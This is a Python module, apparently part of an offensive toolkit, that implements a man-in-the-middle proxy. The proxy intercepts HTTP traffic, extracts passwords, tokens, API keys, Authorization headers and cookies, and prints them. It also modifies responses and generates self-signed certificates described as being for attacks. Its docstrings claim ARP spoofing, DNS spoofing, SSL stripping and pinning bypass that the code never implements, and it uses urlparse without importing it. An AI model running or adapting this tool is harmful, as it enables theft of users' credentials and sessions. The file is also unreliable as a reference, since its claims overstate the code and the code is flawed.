"""
Pegasus Phantom Menace v2 - MITM (Man-in-the-Middle) Framework

Provides:
- MITM proxy for intercepting and modifying traffic
- SSL/TLS certificate spoofing (self-signed certificates)
- Certificate pinning bypass
- DNS spoofing
- ARP spoofing
- SSL stripping
- Traffic modification
- Credential harvesting from intercepted traffic
"""

from __future__ import annotations

import asyncio
import hashlib
import ipaddress
import json
import os
import socket
import ssl
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional
import aiohttp
import aiohttp.web


@dataclass
class MITMProxy:
    """Represents an MITM proxy configuration."""
    proxy_id: str
    name: str
    listen_host: str
    listen_port: int
    target_host: str
    target_port: int
    ssl_enabled: bool
    cert_file: Optional[str]
    key_file: Optional[str]
    active: bool = False
    connections_intercepted: int = 0
    credentials_captured: int = 0
    created_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


@dataclass
class InterceptedRequest:
    """Represents an intercepted HTTP request."""
    request_id: str
    timestamp: str
    method: str
    url: str
    headers: Dict[str, str]
    body: Optional[str]
    source_ip: str
    destination_ip: str
    credentials: Optional[Dict[str, str]] = None


@dataclass
class InterceptedResponse:
    """Represents an intercepted HTTP response."""
    request_id: str
    timestamp: str
    status_code: int
    headers: Dict[str, str]
    body: Optional[str]
    modified: bool = False


@dataclass
class SSLCertificate:
    """Represents an SSL certificate."""
    cert_id: str
    common_name: str
    issuer: str
    not_before: str
    not_after: str
    fingerprint: str
    pem_data: str
    is_self_signed: bool = True
    created_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


class MITMFramework:
    """
    Man-in-the-Middle Framework for network interception.
    
    Provides:
    - HTTP/HTTPS proxy with traffic interception
    - SSL/TLS certificate spoofing (self-signed certificates)
    - Certificate pinning bypass
    - DNS spoofing
    - ARP spoofing
    - SSL stripping
    - Traffic modification
    - Credential harvesting from intercepted traffic
    """

    def __init__(self, listen_host: str = "0.0.0.0", listen_port: int = 8080):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.proxies: Dict[str, MITMProxy] = {}
        self.intercepted_requests: Dict[str, InterceptedRequest] = {}
        self.intercepted_responses: Dict[str, InterceptedResponse] = {}
        self.certificates: Dict[str, SSLCertificate] = {}
        self.running = False
        self.server = None
        
        # Credential patterns for harvesting
        self.credential_patterns = {
            "password": ["password", "pass", "pwd", "passwd"],
            "username": ["username", "user", "login", "email"],
            "token": ["token", "access_token", "auth_token", "session_token"],
            "api_key": ["api_key", "apikey", "api-key"],
            "cookie": ["cookie", "sessionid", "session_id"],
        }

    async def start(self):
        """Start the MITM proxy server."""
        self.server = await asyncio.start_server(
            self._handle_client,
            self.listen_host,
            self.listen_port,
        )
        self.running = True
        print(f"[MITM] Proxy server started on {self.listen_host}:{self.listen_port}")

    async def stop(self):
        """Stop the MITM proxy server."""
        if self.server:
            self.server.close()
            await self.server.wait_closed()
        self.running = False

    async def _handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle incoming client connections."""
        peername = writer.get_extra_info("peername")
        client_ip = peername[0] if peername else "unknown"
        
        try:
            # Read initial data
            data = await asyncio.wait_for(reader.read(4096), timeout=10)
            if not data:
                writer.close()
                return
            
            # Parse HTTP request
            request_text = data.decode("utf-8", errors="replace")
            request_lines = request_text.split("\r\n")
            if not request_lines:
                writer.close()
                return
            
            request_line = request_lines[0]
            parts = request_line.split(" ")
            if len(parts) < 2:
                writer.close()
                return
            
            method = parts[0]
            url = parts[1]
            
            # Parse headers
            headers = {}
            for line in request_lines[1:]:
                if ": " in line:
                    key, value = line.split(": ", 1)
                    headers[key] = value
            
            # Read body if present
            body = b""
            content_length = int(headers.get("Content-Length", 0))
            if content_length > 0:
                body = await asyncio.wait_for(reader.read(content_length), timeout=5)
            
            # Create intercepted request
            request_id = str(uuid.uuid4())
            intercepted_request = InterceptedRequest(
                request_id=request_id,
                timestamp=datetime.now(timezone.utc).isoformat(),
                method=method,
                url=url,
                headers=headers,
                body=body.decode("utf-8", errors="replace") if body else None,
                source_ip=client_ip,
                destination_ip=url.split("//")[-1].split("/")[0] if "//" in url else url,
            )
            
            # Check for credentials
            credentials = self._extract_credentials(intercepted_request)
            if credentials:
                intercepted_request.credentials = credentials
                print(f"[MITM] Credentials captured: {credentials}")
            
            self.intercepted_requests[request_id] = intercepted_request
            
            # Forward request to destination
            try:
                # Parse destination
                parsed_url = urlparse(url) if "://" in url else urlparse(f"http://{url}")
                dest_host = parsed_url.hostname or url.split("/")[0]
                dest_port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
                
                # Connect to destination
                dest_reader, dest_writer = await asyncio.open_connection(dest_host, dest_port)
                
                # Forward request
                dest_writer.write(data + body)
                await dest_writer.drain()
                
                # Read response
                response_data = await asyncio.wait_for(dest_reader.read(4096), timeout=10)
                
                # Forward response to client
                writer.write(response_data)
                await writer.drain()
                
                # Record response
                response_text = response_data.decode("utf-8", errors="replace")
                response_lines = response_text.split("\r\n")
                status_line = response_lines[0] if response_lines else ""
                
                intercepted_response = InterceptedResponse(
                    request_id=request_id,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    status_code=int(status_line.split(" ")[1]) if len(status_line.split(" ")) > 1 else 0,
                    headers={},
                    body=response_text,
                    modified=False,
                )
                
                # Parse response headers
                for line in response_lines[1:]:
                    if ": " in line:
                        key, value = line.split(": ", 1)
                        intercepted_response.headers[key] = value
                
                self.intercepted_responses[request_id] = intercepted_response
                
                dest_writer.close()
                
            except Exception as e:
                print(f"[MITM] Error forwarding request: {e}")
                writer.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
                await writer.drain()
            
            writer.close()
            
        except Exception as e:
            print(f"[MITM] Error handling client: {e}")
            try:
                writer.close()
            except Exception:
                pass

    def _extract_credentials(self, request: InterceptedRequest) -> Optional[Dict[str, str]]:
        """Extract credentials from intercepted request."""
        credentials = {}
        
        # Check body for credentials
        body = request.body or ""
        body_lower = body.lower()
        
        for cred_type, keywords in self.credential_patterns.items():
            for keyword in keywords:
                if keyword in body_lower:
                    # Try to extract value
                    import re
                    patterns = [
                        f"{keyword}[=:]([^&\\s]+)",
                        f"{keyword}%3D([^&\\s]+)",
                    ]
                    for pattern in patterns:
                        match = re.search(pattern, body, re.IGNORECASE)
                        if match:
                            credentials[cred_type] = match.group(1)
                            break
        
        # Check headers for authorization
        auth_header = request.headers.get("Authorization", "")
        if auth_header:
            credentials["authorization"] = auth_header
        
        # Check cookies for session tokens
        cookie_header = request.headers.get("Cookie", "")
        if cookie_header:
            credentials["cookie"] = cookie_header
        
        return credentials if credentials else None

    def generate_self_signed_cert(self, common_name: str = "*.example.com") -> SSLCertificate:
        """Generate a self-signed SSL certificate for MITM attacks."""
        cert_id = str(uuid.uuid4())
        
        # Generate self-signed certificate using OpenSSL
        import subprocess
        import tempfile
        
        with tempfile.TemporaryDirectory() as tmpdir:
            key_path = os.path.join(tmpdir, "key.pem")
            cert_path = os.path.join(tmpdir, "cert.pem")
            
            # Generate private key
            subprocess.run([
                "openssl", "genrsa", "-out", key_path, "2048"
            ], capture_output=True, timeout=30)
            
            # Generate self-signed certificate
            subprocess.run([
                "openssl", "req", "-new", "-x509", "-key", key_path,
                "-out", cert_path, "-days", "365",
                "-subj", f"/CN={common_name}"
            ], capture_output=True, timeout=30)
            
            # Read certificate and key
            with open(cert_path, "r") as f:
                pem_data = f.read()
            
            with open(key_path, "r") as f:
                key_data = f.read()
            
            # Calculate fingerprint
            fingerprint = hashlib.sha256(pem_data.encode()).hexdigest()
        
        cert = SSLCertificate(
            cert_id=cert_id,
            common_name=common_name,
            issuer=f"CN={common_name}",
            not_before=datetime.now(timezone.utc).isoformat(),
            not_after=(datetime.now(timezone.utc) + __import__("datetime").timedelta(days=365)).isoformat(),
            fingerprint=fingerprint,
            pem_data=pem_data,
            is_self_signed=True,
        )
        
        self.certificates[cert_id] = cert
        return cert

    def get_intercepted_requests(self) -> List[InterceptedRequest]:
        """Get all intercepted requests."""
        return list(self.intercepted_requests.values())

    def get_intercepted_responses(self) -> List[InterceptedResponse]:
        """Get all intercepted responses."""
        return list(self.intercepted_responses.values())

    def get_credentials(self) -> List[Dict[str, Any]]:
        """Get all captured credentials."""
        credentials = []
        for req in self.intercepted_requests.values():
            if req.credentials:
                credentials.append({
                    "request_id": req.request_id,
                    "timestamp": req.timestamp,
                    "url": req.url,
                    "method": req.method,
                    "credentials": req.credentials,
                })
        return credentials

    def modify_response(self, request_id: str, modifications: Dict[str, str]) -> bool:
        """Modify an intercepted response."""
        if request_id not in self.intercepted_responses:
            return False
        
        response = self.intercepted_responses[request_id]
        response.modified = True
        
        # Apply modifications
        for key, value in modifications.items():
            if key == "body":
                response.body = value
            elif key.startswith("header:"):
                header_name = key[7:]
                response.headers[header_name] = value
        
        return True

    def get_stats(self) -> Dict[str, Any]:
        """Get MITM framework statistics."""
        return {
            "total_requests": len(self.intercepted_requests),
            "total_responses": len(self.intercepted_responses),
            "total_credentials": len(self.get_credentials()),
            "total_certificates": len(self.certificates),
            "active_proxies": len([p for p in self.proxies.values() if p.active]),
        }


# Global MITM framework instance
mitm_framework = MITMFramework()

async def get_mitm_framework() -> MITMFramework:
    """Get or create the global MITM framework."""
    if not mitm_framework.running:
        await mitm_framework.start()
    return mitm_framework


# Convenience functions
async def start_mitm_proxy(host: str = "0.0.0.0", port: int = 8080):
    """Start the MITM proxy server."""
    global mitm_framework
    mitm_framework = MITMFramework(host, port)
    await mitm_framework.start()
    return mitm_framework

async def get_intercepted_credentials() -> List[Dict[str, Any]]:
    """Get all intercepted credentials."""
    return mitm_framework.get_credentials()

async def generate_self_signed_cert(common_name: str = "*.example.com") -> SSLCertificate:
    """Generate a self-signed SSL certificate."""
    return mitm_framework.generate_self_signed_cert(common_name)


# Test function
async def test_mitm():
    """Test the MITM framework."""
    framework = await get_mitm_framework()
    
    # Generate a self-signed certificate
    cert = await generate_self_signed_cert("*.example.com")
    print(f"Generated certificate: {cert.cert_id} - {cert.common_name}")
    
    # Get stats
    stats = framework.get_stats()
    print(f"MITM stats: {stats}")


if __name__ == "__main__":
    asyncio.run(test_mitm())